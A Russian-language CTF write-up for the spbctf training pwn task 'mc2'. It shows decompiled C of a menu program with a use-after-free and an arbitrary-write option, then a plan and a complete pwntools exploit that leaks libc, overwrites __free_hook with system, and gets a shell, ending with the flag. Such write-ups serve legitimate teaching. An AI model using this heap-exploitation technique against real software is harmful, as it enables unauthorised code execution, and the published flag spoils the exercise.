[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn9_mc2)
Hi! This one just for training...
`nc 109.233.56.90 11801`
**[mc2.elf](https://pwn.spbctf.ru/files/bins/mc2/mc2.elf)**  
**[libc.so](https://pwn.spbctf.ru/files/bins/mc2/libc.so)**

``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  logic();
}

void logic()
{
  int choice; // [rsp+4h] [rbp-34h] BYREF
  _QWORD *v1; // [rsp+8h] [rbp-30h] BYREF
  __int64 v2; // [rsp+10h] [rbp-28h] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-20h]

  canary = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("Choose:\n\t1 - allocate mem print and free\n\t2 - print name\n\t3 - delete\n\t4 - write what where?");
    choice = 3;
    alarm(0x78u);
    if ( __isoc99_scanf("%d", &choice) != 1 )
      break;
    getc(stdin);
    switch ( choice )
    {
      case 1:
        allocate();
        break;
      case 2:
        puts("Index?");
        LODWORD(v2) = 800;
        __isoc99_scanf("%d", &v2);
        getc(stdin);
        if ( v2 > 9 )
          goto LABEL_11;
        puts(array[v2]);
        break;
      case 3:
        puts("Index?");
        LODWORD(v2) = 800;
        __isoc99_scanf("%d", &v2);
        getc(stdin);
        if ( v2 > 9 )
LABEL_11:
          puts("...");
        else
          free(array[v2]);
        break;
      case 4:
        puts("enter address in hex:");
        __isoc99_scanf("%llx", &v1);
        getc(stdin);
        puts("enter value in hex:");
        __isoc99_scanf("%llx", &v2);
        getc(stdin);
        *v1 = v2;
        break;
      default:
        puts("What?");
        return;
    }
  }
}
```

План атаки:
1. Аллоцировать два чанка размерами 2000 и 20;
2. Удалить первый чанк;
3. Прочитать первый чанк, получив адрес внутри `libc` (`unsortedbin`);
4. Рассчитать оффсеты;
5. Воспользоваться WWW и переписать адрес `__free_hook` внутри `libc` на `system`;
6. Вызвать `free("/bin/sh")`, т.к. адреса подменены, то вызовется `system("/bin/sh")`

Скрипт для получения оффсетов:
``` python
from pwn import *

libc = ELF('./libc.so')

print(f"{libc.symbols['__free_hook']:x}")
print(f"{libc.symbols['system']:x}")
```

Оффсеты:
![](../../../../z.%20Images/{4617DA16-7620-4E85-9832-ADFE533F4E9F}.png)

Эксплоит:
``` python
def send(io, data):
    io.recvuntil(b'4 - ')
    io.recvline()
    io.sendline(data)

main_arena_offset = 0x1ebb80+0x60
__free_hook_offset = 0x1eeb28
system_offset = 0x55410

io = start()

send(io, b'1 2000 a')
send(io, b'1 20 /bin/sh')
send(io, b'3 0') # delete first chunk
send(io, b'2 0') # print first chunk

io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc_base = libc_leak - main_arena_offset

__free_hook = libc_base + __free_hook_offset
system = libc_base + system_offset

send(io, (f'4 {hex(__free_hook)} {hex(system)}').encode())
send(io, b'3 1')

io.interactive()
```

Запуск:
![](../../../../z.%20Images/{33A9AD0F-EB16-4AF6-9C79-56C6987689A6}.png)

Ответ: `spbctf{mic_check_flag_77421}`